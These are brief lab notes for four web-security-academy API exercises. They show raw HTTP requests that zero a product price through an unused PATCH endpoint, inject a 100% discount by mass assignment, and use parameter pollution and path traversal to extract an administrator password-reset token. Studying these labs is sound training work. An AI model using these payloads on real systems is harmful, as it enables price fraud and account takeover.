## Lab: Finding and exploiting an unused API endpoint

```plaintext
Find out the PATCH method to change the product price

PATCH /api/products/1/price HTTP/2
Host: 0af7000704ded51582526c6400890053.web-security-academy.net
Cookie: session=rDSexyvM7n1nX5xqoKuH25BUPpgVkMp1
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0af7000704ded51582526c6400890053.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Content-Type: application/json; charset=utf-8
Content-Length: 156

{"price":0,"message":"aaaaaaaaaaaa"}
```
## Lab: Exploiting a mass assignment vulnerability

```plaintext
Try to change price of product on checkout API but not working
Add the discount percent on checkout api

POST /api/checkout HTTP/2
Host: 0a18004c04d49ae380abb72100f500d5.web-security-academy.net
Cookie: session=8DYZnI2CzQz2PQGMQMIEpdGjMvoThv9g
Content-Length: 90
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Content-Type: text/plain;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: */*
Origin: https://0a18004c04d49ae380abb72100f500d5.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a18004c04d49ae380abb72100f500d5.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","quantity":1}]}
```

## Lab: Exploiting server-side parameter pollution in a query string

```plaintext
Solution:

Discover the Forgot password function.
Try to pass another argument

csrf=6UZpkuIIRFyu4gQyl15stu9uTLWT3WtU&username=administrator%26x=5
We got
{"error": "Parameter is not supported."}

Try to add # after the username field

csrf=6UZpkuIIRFyu4gQyl15stu9uTLWT3WtU&username=administrator#
We got
{"error": "Field not specified."}

Maybe after the username field, it has an field called "field"

Try to add this filed with a random value

csrf=6UZpkuIIRFyu4gQyl15stu9uTLWT3WtU&username=administrator%26filed=abc#
{"error": "Parameter is not supported."}

Brute force the value to add to Intruder and select Simple Payload with the Payload list will be load from built-in Server-side variable names

We got some valid field like: username, email

In the js source, we have a file `/static/js/forgotPassword.js`

Password reset endpoint will be something like
`/forgot-password?reset_token=${resetToken}`

Try to set the field value to reset_token and then we got the reset_token password for the administratos account
```


# Lab: Exploiting server-side parameter pollution in a REST URL

```plaintext
Scan with BackSlash Powered Scanner we find that:
username=././administrator -> working

Find API definition
username=../../../../openapi.json%23 


POST /forgot-password?ilpox13=1 HTTP/2
Host: 0a28001b040674568078673c00530045.web-security-academy.net
Cookie: session=H1PCez7S4k3y4fQohF1Pjr7pOeOkkf1S
Content-Length: 103
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Content-Type: x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: */*
Origin: https://ilpox13.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a7f001e04cdbc0c83a17e6500aa00b2.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Via: ilpox13

csrf=FpcqDajVBymoRKBdHlpAbqLNALSrfZwS&username=../../v1/users/administrator/field/passwordResetToken%23
```